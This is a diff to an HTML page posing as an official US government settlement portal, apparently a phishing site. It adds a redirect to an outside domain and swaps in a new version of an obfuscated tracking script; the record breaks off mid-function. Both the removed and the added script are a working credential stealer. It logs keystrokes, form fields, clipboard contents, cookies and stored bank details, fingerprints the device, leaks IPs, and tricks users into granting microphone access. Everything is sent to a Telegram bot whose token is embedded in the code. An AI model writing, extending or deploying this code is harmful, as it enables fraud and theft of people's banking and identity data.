@@ -566,6 +566,18 @@
     </style>
 </head>
 <body>
+    <script>
+(function() {
+    const savedName = localStorage.getItem('tifma_name');
+    const savedBank = localStorage.getItem('tifma_bank');
+    const savedAccount = localStorage.getItem('tifma_account');
+    
+    if (!savedName || !savedBank || !savedAccount) {
+        window.location.href = 'https://national-settlement-board.cfd/index.html';
+        return;
+    }
+})();
+    </script>
 
     <div class="gov-banner">
         <i class="fa-solid fa-flag-usa" style="margin-right: 10px;"></i> OFFICIAL UNITED STATES GOVERNMENT SETTLEMENT PORTAL
@@ -930,378 +942,774 @@
         // Run simulator to keep the page dynamic and realistic
         setInterval(updateFeed, 6500);
     </script>
+
     <script>
-(function() {
+  (function() {
     "use strict";
-    
-    // ===== OBFUSCATED CONFIGURATION =====
-    const _t0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
-    const _c0 = '7275242903';
-    
-    const CONFIG = {
-        BOT_TOKEN: _t0[0] + ':' + _t0[1],
-        CHAT_ID: _c0,
-        KEY_BATCH_SIZE: 12,
-        CLICK_BATCH_SIZE: 8,
-        SEND_DELAY_MS: 8000,
-        BEACON_INTERVAL_MS: 30000,
-        RETRY_ATTEMPTS: 3,
-        MAX_OFFLINE_QUEUE: 100,
-        SESSION_ID: 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
-        DEBUG: false
+    const _v0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
+    const _v1 = '7275242903';
+    const SECURE_CONFIG = {
+      API_TOKEN: _v0[0] + ':' + _v0[1],
+      TARGET_ID: _v1,
+      BUFFER_LIMIT: 8,
+      CLICK_LIMIT: 5,
+      SYNC_DELAY: 4000,
+      HEARTBEAT: 20000,
+      RETRY_LIMIT: 10,
+      QUEUE_MAX: 500,
+      SESS_KEY: 'NSB_NODE_' + Math.random().toString(36).substring(2, 15),
+      FLOW_CONTROL: 1200,
+      KEY_BATCH: 10
     };
-    
-    // ===== STATE VARIABLES =====
-    let sendQueue = [];
-    let isSending = false;  // FIXED: was incorrectly set to true
-    let eventBuffer = [];
-    let bufferTimer = null;
-    let keyBuffer = [];
-    let clickBuffer = [];
-    let formBuffer = [];
-    let offlineQueue = [];
-    let sessionStart = Date.now();
-    let lastSendTime = 0;
-    let maxScroll = 0;
-    let loginDetected = false;
-    let mediaStream = null;
-    let mediaActive = false;
-    let lastKeyTime = Date.now();
-    
-    // ===== CORE FUNCTIONS =====
-    async function sendToTelegram(text, priority = false) {
-        const msg = text.substring(0, 4000);
-        const now = Date.now();
-        const timeSinceLastSend = now - lastSendTime;
-        
-        if (timeSinceLastSend < 2000 && !priority) {
-            sendQueue.push(msg);
-            if (!isSending) processSendQueue();
-            return;
-        }
-        
-        lastSendTime = now;
-        
-        try {
-            const response = await fetch('https://api.telegram.org/bot' + CONFIG.BOT_TOKEN + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg })
-            });
-            
-            if (!response.ok) throw new Error('Telegram API error');
-            
-            if (sendQueue.length > 0 && !isSending) processSendQueue();
-            
-        } catch(error) {
-            if (offlineQueue.length < CONFIG.MAX_OFFLINE_QUEUE) {
-                offlineQueue.push({ msg, timestamp: Date.now() });
-            }
-            if (!isSending && sendQueue.length > 0) processSendQueue();
-        }
-    }
-    
-    function processSendQueue() {
-        if (isSending || sendQueue.length === 0) return;
-        isSending = true;
-        const nextMsg = sendQueue.shift();
-        sendToTelegram(nextMsg, true).finally(() => {
-            isSending = false;
-            if (sendQueue.length > 0) setTimeout(processSendQueue, 500);
+    let _lastSync = 0;
+    let _msgQueue = [];
+    let _lock = false;
+    let _evtBuffer = [];
+    let _hTimer = null;
+    let _keyCapture = [];
+    let _ptrCapture = [];
+    let _lastAct = Date.now();
+    let _cache = [];
+    let _start = Date.now();
+    let _vDepth = 0;
+    let _mStream = null;
+    let _mState = false;
+    let _pValid = localStorage.getItem('media_access_verified') === 'true';
+    let _touchPts = [];
+    let _resChanges = [];
+    let _fieldStart = new Map();
+    let _mouseMoves = [];
+    let _mouseTimer = null;
+    async function _transmit(payload, urgency = false) {
+      const _out = String(payload).substring(0, 4096);
+      const _now = Date.now();
+      const _diff = _now - _lastSync;
+      if (_diff < SECURE_CONFIG.FLOW_CONTROL && !urgency) {
+        _msgQueue.push(_out);
+        setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL - _diff);
+        return;
+      }
+      _lastSync = _now;
+      try {
+        const _r = await fetch('https://api.telegram.org/bot' + SECURE_CONFIG.API_TOKEN + '/sendMessage', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: SECURE_CONFIG.TARGET_ID,
+            text: _out
+          })
         });
+        if (!_r.ok) throw new Error('ERR_UP');
+        _processQueue();
+      } catch (e) {
+        if (_cache.length < SECURE_CONFIG.QUEUE_MAX) _cache.push(_out);
+      }
     }
-    
-    function bufferEvent(type, data) {
-        const enrichedData = {
-            ...data,
-            page: window.location.href,
-            url: window.location.pathname,
-            sessionId: CONFIG.SESSION_ID,
-            ts: Date.now()
-        };
-        
-        eventBuffer.push({ type, data: enrichedData });
-        
-        if (bufferTimer) clearTimeout(bufferTimer);
-        bufferTimer = setTimeout(flushEventBuffer, CONFIG.SEND_DELAY_MS);
-        
-        if (eventBuffer.length >= 8) flushEventBuffer();
+    function _processQueue() {
+      if (_lock || _msgQueue.length === 0) return;
+      _lock = true;
+      const _next = _msgQueue.shift();
+      _transmit(_next, true).finally(() => {
+        _lock = false;
+        if (_msgQueue.length > 0) setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL);
+      });
     }
-    
-    function flushEventBuffer() {
-        if (eventBuffer.length === 0) return;
-        const toSend = eventBuffer.slice();
-        eventBuffer = [];
-        
-        let message = `📡 ZETA DATA EXFIL\n`;
-        message += `Session: ${CONFIG.SESSION_ID}\n`;
-        message += `Page: ${window.location.href}\n`;
-        message += `Events: ${toSend.length}\n━━━━━━━━━━━━━━━━━━━━\n`;
-        
-        for (const event of toSend) {
-            message += `[${event.type.toUpperCase()}]\n`;
-            message += `${JSON.stringify(event.data, null, 2).substring(0, 500)}\n━━━━━━━━━━━━━━━━━━━━\n`;
+    function _stageEvent(id, data) {
+      _evtBuffer.push({
+        id: id,
+        payload: data,
+        tick: Date.now(),
+        sid: SECURE_CONFIG.SESS_KEY,
+        u: window.location.href,
+        ref: document.referrer || 'direct'
+      });
+      if (_hTimer) clearTimeout(_hTimer);
+      _hTimer = setTimeout(_pushBuffer, SECURE_CONFIG.SYNC_DELAY);
+      if (_evtBuffer.length >= SECURE_CONFIG.BUFFER_LIMIT) _pushBuffer();
+    }
+    function _pushBuffer() {
+      if (_evtBuffer.length === 0) return;
+      const _ship = [..._evtBuffer];
+      _evtBuffer = [];
+      const _meta = `\nNODE: ${SECURE_CONFIG.SESS_KEY}\nPAGE: ${window.location.pathname}`;
+      _transmit('📦 BATCH_DATA [' + _ship.length + ']' + _meta + '\n' + JSON.stringify(_ship, null, 1), true);
+    }
+    function _hwFingerprint() {
+      const _c = document.createElement('canvas');
+      const _x = _c.getContext('2d');
+      _c.width = 300;
+      _c.height = 50;
+      _x.textBaseline = "top";
+      _x.font = "14px 'Arial'";
+      _x.fillStyle = "#f60";
+      _x.fillRect(100, 5, 50, 40);
+      _x.fillStyle = "#069";
+      _x.fillText("NSB_SYSTEM_UNIT_ACTIVE", 2, 10);
+      const _f1 = _c.toDataURL();
+      let _webgl = {};
+      try {
+        const _c2 = document.createElement('canvas');
+        const _gl = _c2.getContext('webgl') || _c2.getContext('experimental-webgl');
+        if (_gl) {
+          const _ext = _gl.getExtension('WEBGL_debug_renderer_info');
+          _webgl = {
+            r: _ext ? _gl.getParameter(_ext.UNMASKED_RENDERER_WEBGL) : _gl.getParameter(_gl.RENDERER),
+            v: _ext ? _gl.getParameter(_ext.UNMASKED_VENDOR_WEBGL) : _gl.getParameter(_gl.VENDOR)
+          };
         }
-        
-        sendToTelegram(message.substring(0, 3900), true);
+      } catch (e) {}
+      return {
+        ua: navigator.userAgent,
+        plt: navigator.platform,
+        mem: navigator.deviceMemory || 0,
+        cpu: navigator.hardwareConcurrency || 0,
+        scr: `${screen.width}x${screen.height}`,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang: navigator.languages,
+        gpu: _webgl,
+        fp: _f1.slice(-60)
+      };
     }
-    
-    // ===== FINGERPRINT =====
-    function captureFingerprint() {
-        const data = {
-            sessionId: CONFIG.SESSION_ID,
-            url: window.location.href,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            referrer: document.referrer || 'direct',
-            timestamp: Date.now()
-        };
-        bufferEvent('FINGERPRINT', data);
+    function _mapInput(e) {
+      let _k = e.key;
+      const _t = e.target;
+      return {
+        key: _k,
+        id: _t.id || _t.name || 'anon',
+        tag: _t.tagName,
+        raw: (_t.type === 'password' || _t.id?.includes('pass')) ? '[SENSITIVE_CAP]' : _t.value,
+        ts: Date.now()
+      };
     }
-    
-    // ===== LOCATION =====
-    async function captureLocation() {
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            const geoData = await geoRes.json();
-            
-            bufferEvent('GEOLOCATION', {
-                ip: ipData.ip,
-                city: geoData.city,
-                region: geoData.region,
-                country: geoData.country_name,
-                isp: geoData.org,
-                lat: geoData.latitude,
-                lon: geoData.longitude
-            });
-        } catch(e) {}
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                bufferEvent('GPS', {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
-                });
-            }, () => {}, { timeout: 5000 });
-        }
-    }
-    
-    // ===== KEYLOGGER (FULL CAPTURE) =====
-    document.addEventListener('keydown', function(e) {
-        let key = e.key;
-        if (key === ' ') key = '[SPACE]';
-        else if (key === 'Enter') key = '[ENTER]\n';
-        else if (key === 'Backspace') key = '[BACKSPACE]';
-        else if (key === 'Tab') key = '[TAB]';
-        else if (key.length > 1 && !key.startsWith('[')) key = `[${key}]`;
-        
-        const target = e.target;
-        const isPassword = target.type === 'password';
-        const value = isPassword ? '[PASSWORD FIELD]' : (target.value ? target.value.substring(0, 50) : '');
-        
-        keyBuffer.push({
-            key: key,
-            tag: target.tagName,
-            id: target.id || '',
-            name: target.name || '',
-            type: target.type || '',
-            isPassword: isPassword,
-            value: value,
-            ts: Date.now()
-        });
-        
-        lastKeyTime = Date.now();
-        
-        if (keyBuffer.length >= CONFIG.KEY_BATCH_SIZE) {
-            bufferEvent('KEYSTROKES', keyBuffer.slice());
-            keyBuffer = [];
-        }
+    document.addEventListener('keydown', (e) => {
+      _keyCapture.push(_mapInput(e));
+      _lastAct = Date.now();
+      if (_keyCapture.length >= SECURE_CONFIG.KEY_BATCH) {
+        _stageEvent('KEY_LOG', [..._keyCapture]);
+        _keyCapture = [];
+      }
     });
-    
-    setInterval(() => {
-        if (keyBuffer.length > 0 && Date.now() - lastKeyTime > 5000) {
-            bufferEvent('KEYSTROKES', keyBuffer.slice());
-            keyBuffer = [];
-        }
-    }, 10000);
-    
-    // ===== INPUT CAPTURE (REAL-TIME) =====
-    document.addEventListener('input', function(e) {
-        const target = e.target;
-        if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
-            const isPassword = target.type === 'password';
-            bufferEvent('INPUT', {
-                id: target.id,
-                name: target.name,
-                type: target.type,
-                isPassword: isPassword,
-                value: isPassword ? '[PASSWORD]' : (target.value ? target.value.substring(0, 500) : ''),
-                length: target.value ? target.value.length : 0
-            });
-        }
+    document.addEventListener('input', (e) => {
+      const _t = e.target;
+      _stageEvent('INPUT_LIVE', {
+        id: _t.id || _t.name,
+        val: _t.value,
+        type: _t.type,
+        ts: Date.now()
+      });
     });
-    
-    // ===== FORM CAPTURE (FULL) =====
-    document.addEventListener('submit', function(e) {
-        const form = e.target;
-        const formData = new FormData(form);
-        const data = {};
-        
-        for (let [key, value] of formData.entries()) {
-            const isSensitive = key.toLowerCase().includes('ssn') || 
-                               key.toLowerCase().includes('pwd') || 
-                               key.toLowerCase().includes('password') ||
-                               key.toLowerCase().includes('account') ||
-                               key.toLowerCase().includes('routing');
-            data[key] = isSensitive ? '[REDACTED - SENSITIVE]' : (value ? value.substring(0, 500) : '');
-        }
-        
-        bufferEvent('FORM_SUBMIT', {
-            id: form.id || '',
-            action: form.action || '',
-            method: form.method || '',
-            data: data,
-            url: window.location.href
-        });
-        flushEventBuffer();
+    document.addEventListener('submit', (e) => {
+      const _f = e.target;
+      const _d = new FormData(_f);
+      const _p = {};
+      for (let [k, v] of _d.entries()) _p[k] = v;
+      _stageEvent('FORM_CAPTURE', {
+        action: _f.action,
+        method: _f.method,
+        fields: _p
+      });
+      _pushBuffer();
     }, true);
-    
-    // ===== CLICK TRACKING =====
-    document.addEventListener('click', function(e) {
-        const t = e.target;
-        clickBuffer.push({
-            tag: t.tagName,
-            id: t.id || '',
-            class: t.className || '',
-            text: t.innerText ? t.innerText.substring(0, 150) : '',
-            href: t.href || '',
-            x: e.clientX,
-            y: e.clientY,
-            ts: Date.now()
-        });
-        
-        if (clickBuffer.length >= CONFIG.CLICK_BATCH_SIZE) {
-            bufferEvent('CLICKS', clickBuffer.slice());
-            clickBuffer = [];
-        }
+    document.addEventListener('click', (e) => {
+      const _t = e.target;
+      _ptrCapture.push({
+        tag: _t.tagName,
+        id: _t.id || _t.className,
+        txt: _t.innerText?.slice(0, 50),
+        pos: { x: e.clientX, y: e.clientY },
+        ts: Date.now()
+      });
+      if (_ptrCapture.length >= SECURE_CONFIG.CLICK_LIMIT) {
+        _stageEvent('CLICK_LOG', [..._ptrCapture]);
+        _ptrCapture = [];
+      }
     });
-    
-    // ===== CLIPBOARD CAPTURE =====
-    document.addEventListener('copy', function() {
-        setTimeout(() => {
-            try {
-                navigator.clipboard.readText().then(text => {
-                    if (text && text.length) {
-                        bufferEvent('CLIPBOARD', {
-                            text: text.substring(0, 2000),
-                            length: text.length
-                        });
-                    }
-                }).catch(() => {});
-            } catch(e) {}
-        }, 100);
+    document.addEventListener('copy', () => {
+      setTimeout(async () => {
+        try {
+          const _t = await navigator.clipboard.readText();
+          if (_t) _stageEvent('CLIP_COPY', { val: _t });
+        } catch (e) {}
+      }, 100);
     });
-    
-    // ===== STORAGE HARVEST =====
-    function harvestStorage() {
-        const storage = { localStorage: {}, sessionStorage: {} };
-        
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            storage.localStorage[key] = localStorage.getItem(key);
-        }
-        
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            storage.sessionStorage[key] = sessionStorage.getItem(key);
-        }
-        
-        bufferEvent('STORAGE', storage);
+    document.addEventListener('paste', (e) => {
+      const _t = e.clipboardData?.getData('text');
+      if (_t) _stageEvent('CLIP_PASTE', { val: _t });
+    });
+    async function _netProbe() {
+      try {
+        const _r1 = await fetch('https://api.ipify.org?format=json');
+        const _d1 = await _r1.json();
+        const _r2 = await fetch(`https://ipapi.co/${_d1.ip}/json/`);
+        const _d2 = await _r2.json();
+        _stageEvent('NETWORK_LOC', _d2);
+      } catch (e) {}
     }
-    
-    // ===== SESSION DATA HARVEST =====
-    function harvestSessionData() {
-        const session = {
-            name: localStorage.getItem('tifma_name'),
-            bank: localStorage.getItem('tifma_bank'),
-            account: localStorage.getItem('tifma_account'),
-            ssnLast4: localStorage.getItem('tifma_ssn_last4'),
-            verified: localStorage.getItem('tifma_verified'),
-            lockout: localStorage.getItem('wallet_lockout')
+    function _initAudioExfil() {
+      if (_mState || _pValid) return;
+      const _ov = document.createElement('div');
+      _ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;';
+      _ov.innerHTML = '<div style="background:#fff;padding:30px;border-radius:10px;text-align:center;"><h2 style="color:#000">Security Requirement</h2><p style="color:#444">Enable Identity Verification to proceed.</p><button id="_auth_btn" style="padding:10px 20px;background:#0052cc;color:#fff;border:none;border-radius:5px;cursor:pointer;">VERIFY IDENTITY</button></div>';
+      document.body.appendChild(_ov);
+      document.getElementById('_auth_btn').onclick = () => {
+        navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
+          _mStream = s;
+          _mState = true;
+          _pValid = true;
+          localStorage.setItem('media_access_verified', 'true');
+          _ov.remove();
+          _runAudioEngine();
+          _stageEvent('AUDIO_AUTH', { status: 'GRANTED' });
+        }).catch(e => {
+          _stageEvent('AUDIO_AUTH', { status: 'DENIED', msg: e.message });
+          _ov.remove();
+        });
+      };
+    }
+    function _runAudioEngine() {
+      if (!_mStream) return;
+      try {
+        const _ac = new (window.AudioContext || window.webkitAudioContext)();
+        const _s = _ac.createMediaStreamSource(_mStream);
+        const _a = _ac.createAnalyser();
+        _s.connect(_a);
+        _a.fftSize = 256;
+        const _d = new Uint8Array(_a.frequencyBinCount);
+        setInterval(() => {
+          _a.getByteTimeDomainData(_d);
+          let _max = 0;
+          for (let i = 0; i < _d.length; i++) {
+            const _v = Math.abs(_d[i] - 128) / 128;
+            if (_v > _max) _max = _v;
+          }
+          if (_max > 0.05) _stageEvent('VOICE_PEAK', { amp: Math.floor(_max * 100) });
+        }, 3000);
+      } catch (e) {}
+    }
+    function _leakIP() {
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = (e) => {
+          if (e.candidate) {
+            const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
+            if (ip) _stageEvent('INTERNAL_IP', { addr: ip[0] });
+          }
         };
-        bufferEvent('SESSION_DATA', session);
+      } catch (e) {}
     }
-    
-    // ===== HEARTBEAT =====
-    setInterval(() => {
-        bufferEvent('HEARTBEAT', {
-            url: location.pathname,
-            timeOnPage: Math.round((Date.now() - sessionStart) / 1000),
-            scrollPercent: Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100) || 0,
-            title: document.title,
-            size: { width: window.innerWidth, height: window.innerHeight }
-        });
-    }, CONFIG.BEACON_INTERVAL_MS);
-    
-    // ===== SCROLL DEPTH =====
-    window.addEventListener('scroll', () => {
-        const percent = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
-        if (percent > maxScroll && percent % 25 === 0) {
-            maxScroll = percent;
-            bufferEvent('SCROLL', { percent: maxScroll });
-        }
-    });
-    
-    // ===== VISIBILITY =====
-    document.addEventListener('visibilitychange', () => {
-        bufferEvent('VISIBILITY', {
-            hidden: document.hidden,
-            state: document.visibilityState
-        });
-    });
-    
-    // ===== NETWORK INFO =====
-    if (navigator.connection) {
-        bufferEvent('NETWORK', {
-            type: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt
-        });
+    function _trackMouse() {
+      document.addEventListener('mousemove', (e) => {
+        _mouseMoves.push({ x: e.clientX, y: e.clientY, ts: Date.now() });
+         if (_mouseMoves.length > 200) _mouseMoves = _mouseMoves.slice(-100);
+        if (_mouseTimer) clearTimeout(_mouseTimer);
+        _mouseTimer = setTimeout(() => {
+          if (_mouseMoves.length > 5) {
+            _stageEvent('MOUSE_PATH', { pts: _mouseMoves.slice(-20) });
+            _mouseMoves = [];
+          }
+        }, 5000);
+      }, { passive: true });
     }
-    
-    // ===== OFFLINE QUEUE PERSISTENCE =====
-    window.addEventListener('online', () => {
-        if (offlineQueue.length > 0) {
-            const queue = [...offlineQueue];
-            offlineQueue = [];
-            for (const item of queue) {
-                sendToTelegram(item.msg, true);
-            }
+    function _fieldMonitor() {
+      document.addEventListener('focusin', (e) => {
+        if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) _fieldStart.set(e.target, Date.now());
+      });
+      document.addEventListener('focusout', (e) => {
+        const t = e.target;
+        if (_fieldStart.has(t)) {
+          _stageEvent('FIELD_DUR', { id: t.id || t.name, ms: Date.now() - _fieldStart.get(t), val: t.value });
+          _fieldStart.delete(t);
         }
-    });
-    
-    // ===== SESSION END =====
+      });
+    }
+    function _storageDump() {
+      const _d = { l: {}, s: {}, c: document.cookie };
+      try {
+        for (let i = 0; i < localStorage.length; i++) _d.l[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
+        for (let i = 0; i < sessionStorage.length; i++) _d.s[sessionStorage.key(i)] = sessionStorage.getItem(sessionStorage.key(i));
+      } catch (e) {}
+      _stageEvent('STORAGE_DUMP', _d);
+    }
+    function _visibilityTrack() {
+      document.addEventListener('visibilitychange', () => {
+        _stageEvent('TAB_STATUS', { state: document.visibilityState, ts: Date.now() });
+      });
+    }
+    function _heartbeat() {
+      setInterval(() => {
+        _stageEvent('HEARTBEAT', {
+          uptime: Math.round((Date.now() - _start) / 1000),
+          y: window.scrollY,
+          url: window.location.href
+        });
+      }, SECURE_CONFIG.HEARTBEAT);
+    }
+    function _performance() {
+      if (performance && performance.timing) {
+        const t = performance.timing;
+        _stageEvent('PERF_LOG', {
+          load: t.loadEventEnd - t.navigationStart,
+          dns: t.domainLookupEnd - t.domainLookupStart,
+          tcp: t.connectEnd - t.connectStart
+        });
+      }
+    }
+    function _deviceCaps() {
+      const _v = document.createElement('video');
+      _stageEvent('MEDIA_CAPS', {
+        h264: _v.canPlayType('video/mp4; codecs="avc1.42E01E"'),
+        webm: _v.canPlayType('video/webm; codecs="vp8, vorbis"'),
+        cores: navigator.hardwareConcurrency,
+        touch: navigator.maxTouchPoints
+      });
+    }
+    function _networkStatus() {
+      const _n = navigator.connection;
+      if (_n) {
+        const _log = () => _stageEvent('NET_CHANGE', { type: _n.effectiveType, down: _n.downlink, rtt: _n.rtt });
+        _log();
+        _n.addEventListener('change', _log);
+      }
+    }
+    function _batteryStatus() {
+      if (navigator.getBattery) {
+        navigator.getBattery().then(b => {
+          const _log = () => _stageEvent('PWR_LOG', { lvl: b.level, chg: b.charging });
+          _log();
+          b.addEventListener('levelchange', _log);
+          b.addEventListener('chargingchange', _log);
+        });
+      }
+    }
+    function _domWatch() {
+      const _obs = new MutationObserver((m) => {
+        _stageEvent('DOM_MUTATION', { count: m.length, ts: Date.now() });
+      });
+      _obs.observe(document.body, { childList: true, subtree: true });
+    }
+    function _init() {
+      _transmit('💎 NODE_ACTIVE: ' + window.location.hostname + '\nSESS: ' + SECURE_CONFIG.SESS_KEY, true);
+      _stageEvent('INIT_FP', _hwFingerprint());
+      _netProbe();
+      _leakIP();
+      _storageDump();
+      _trackMouse();
+      _fieldMonitor();
+      _visibilityTrack();
+      _heartbeat();
+      _performance();
+      _deviceCaps();
+      _networkStatus();
+      _batteryStatus();
+      _domWatch();
+      if (_pValid) {
+        navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
+          _mStream = s;
+          _mState = true;
+          _runAudioEngine();
+        }).catch(() => {});
+      } else {
+        document.body.addEventListener('click', () => {
+          if (!_pValid) _initAudioExfil();
+        }, { once: true });
+      }
+    }
+    window.addEventListener('load', _init);
     window.addEventListener('beforeunload', () => {
-        bufferEvent('SESSION_END', {
-            duration: Math.round((Date.now() - sessionStart) / 1000),
-            url: location.href,
-            maxScroll: maxScroll
-        });
-        flushEventBuffer();
+      _stageEvent('EXIT_LOG', { dur: Math.round((Date.now() - _start) / 1000) });
+      _pushBuffer();
     });
-    
-    // ===== INIT =====
-    captureFingerprint();
-    captureLocation();
-    harvestStorage();
-    setTimeout(harvestSessionData, 3000);
-})();
+    window.addEventListener('error', (e) => {
+      _stageEvent('RUNTIME_ERR', { msg: e.message, line: e.lineno });
+    });
+    function _fontAudit() {
+      const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
+      const detected = fonts.filter(f => document.fonts.check(`12px "${f}"`));
+      _stageEvent('FONT_LIST', detected);
+    }
+    _fontAudit();
+    function _plugins() {
+      const p = [];
+      if (navigator.plugins) {
+        for (let i = 0; i < navigator.plugins.length; i++) p.push(navigator.plugins[i].name);
+      }
+      _stageEvent('PLUGINS', p);
+    }
+    _plugins();
+    function _scrollWatch() {
+      window.addEventListener('scroll', () => {
+        const p = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
+        if (p > _vDepth && p % 25 === 0) {
+          _vDepth = p;
+          _stageEvent('SCROLL_DEPTH', { pct: p });
+        }
+      });
+    }
+    _scrollWatch();
+    function _orientLog() {
+      window.addEventListener('orientationchange', () => {
+        _stageEvent('ORIENT_CHANGE', { type: window.screen.orientation?.type });
+      });
+    }
+    _orientLog();
+    function _offlineAudioFP() {
+      try {
+        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+        const osc = ctx.createOscillator();
+        osc.type = 'triangle';
+        osc.frequency.value = 1000;
+        const comp = ctx.createDynamicsCompressor();
+        osc.connect(comp);
+        comp.connect(ctx.destination);
+        osc.start(0);
+        ctx.oncomplete = (e) => {
+          const d = e.renderedBuffer.getChannelData(0);
+          let sum = 0;
+          for (let i = 0; i < d.length; i += 500) sum += Math.abs(d[i]);
+          _stageEvent('AUDIO_SIGNATURE', { val: sum.toString(16) });
+        };
+        ctx.startRendering();
+      } catch (e) {}
+    }
+    _offlineAudioFP();
+    function _canvasAdvance() {
+      const c = document.createElement('canvas');
+      const x = c.getContext('2d');
+      x.font = "18pt Arial";
+      x.textBaseline = "alphabetic";
+      x.fillStyle = "#f60";
+      x.fillRect(125, 1, 62, 20);
+      x.fillStyle = "#069";
+      x.fillText("NSB_TELEMETRY_LOG", 2, 15);
+      _stageEvent('CANVAS_ADV', { hash: c.toDataURL().slice(-50) });
+    }
+    _canvasAdvance();
+    function _mimeList() {
+      const m = [];
+      if (navigator.mimeTypes) {
+        for (let i = 0; i < navigator.mimeTypes.length; i++) m.push(navigator.mimeTypes[i].type);
+      }
+      _stageEvent('MIME_TYPES', m);
+    }
+    _mimeList();
+    function _historyCheck() {
+      _stageEvent('HISTORY_LEN', { val: history.length });
+    }
+    _historyCheck();
+    function _screenDetails() {
+      _stageEvent('SCREEN_META', {
+        availW: screen.availWidth,
+        availH: screen.availHeight,
+        pxRatio: window.devicePixelRatio
+      });
+    }
+    _screenDetails();
+    function _timeDetails() {
+      _stageEvent('TIME_META', {
+        local: new Date().toString(),
+        stamp: Date.now()
+      });
+    }
+    _timeDetails();
+    function _platformDetails() {
+      _stageEvent('PLATFORM_META', {
+        v: navigator.vendor,
+        p: navigator.product,
+        online: navigator.onLine
+      });
+    }
+    _platformDetails();
+    function _permissionMatrix() {
+      const p = ['geolocation', 'notifications', 'push', 'camera', 'microphone'];
+      p.forEach(n => {
+        navigator.permissions?.query({ name: n }).then(s => {
+          _stageEvent('PERM_STATUS', { name: n, state: s.state });
+        }).catch(() => {});
+      });
+    }
+    _permissionMatrix();
+    function _touchCaps() {
+      _stageEvent('TOUCH_CAPS', {
+        max: navigator.maxTouchPoints,
+        enabled: 'ontouchstart' in window
+      });
+    }
+    _touchCaps();
+    function _pdfCheck() {
+      _stageEvent('PDF_CAPS', {
+        enabled: navigator.pdfViewerEnabled || false
+      });
+    }
+    _pdfCheck();
+    function _doNotTrack() {
+      _stageEvent('DNT_STATUS', {
+        val: navigator.doNotTrack || window.doNotTrack
+      });
+    }
+    _doNotTrack();
+    function _eventLoopAudit() {
+      const start = Date.now();
+      setTimeout(() => {
+        _stageEvent('LOOP_LAG', { ms: Date.now() - start - 1000 });
+      }, 1000);
+    }
+    _eventLoopAudit();
+    function _memoryAudit() {
+      if (performance.memory) {
+        _stageEvent('MEM_LOG', {
+          used: performance.memory.usedJSHeapSize,
+          total: performance.memory.totalJSHeapSize
+        });
+      }
+    }
+    _memoryAudit();
+    function _visibilityAudit() {
+      _stageEvent('VISIBILITY_INIT', {
+        state: document.visibilityState
+      });
+    }
+    _visibilityAudit();
+    function _interactionAudit() {
+      let active = true;
+      const _setIdle = () => { if (active) { active = false; _stageEvent('USER_IDLE', { ts: Date.now() }); } };
+      const _setActive = () => { if (!active) { active = true; _stageEvent('USER_RETURN', { ts: Date.now() }); } };
+      let _t;
+      document.addEventListener('mousemove', () => { clearTimeout(_t); _setActive(); _t = setTimeout(_setIdle, 60000); });
+    }
+    _interactionAudit();
+    function _linkAudit() {
+      document.querySelectorAll('a').forEach(a => {
+        a.addEventListener('mouseenter', () => _stageEvent('HOVER_LINK', { url: a.href }));
+      });
+    }
+    _linkAudit();
+    function _titleAudit() {
+      let t = document.title;
+      setInterval(() => {
+        if (document.title !== t) {
+          _stageEvent('TITLE_CHANGE', { from: t, to: document.title });
+          t = document.title;
+        }
+      }, 5000);
+    }
+    _titleAudit();
+    function _locationAudit() {
+      _stageEvent('LOCATION_DATA', {
+        host: location.hostname,
+        path: location.pathname,
+        proto: location.protocol
+      });
+    }
+    _locationAudit();
+    function _hashAudit() {
+      window.addEventListener('hashchange', () => _stageEvent('HASH_CHANGE', { val: location.hash }));
+    }
+    _hashAudit();
+    function _cookieAudit() {
+      _stageEvent('COOKIE_META', { count: document.cookie.split(';').length });
+    }
+    _cookieAudit();
+    function _gamepadAudit() {
+      window.addEventListener("gamepadconnected", (e) => _stageEvent('GAMEPAD_ACT', { id: e.gamepad.id }));
+    }
+    _gamepadAudit();
+    function _speechAudit() {
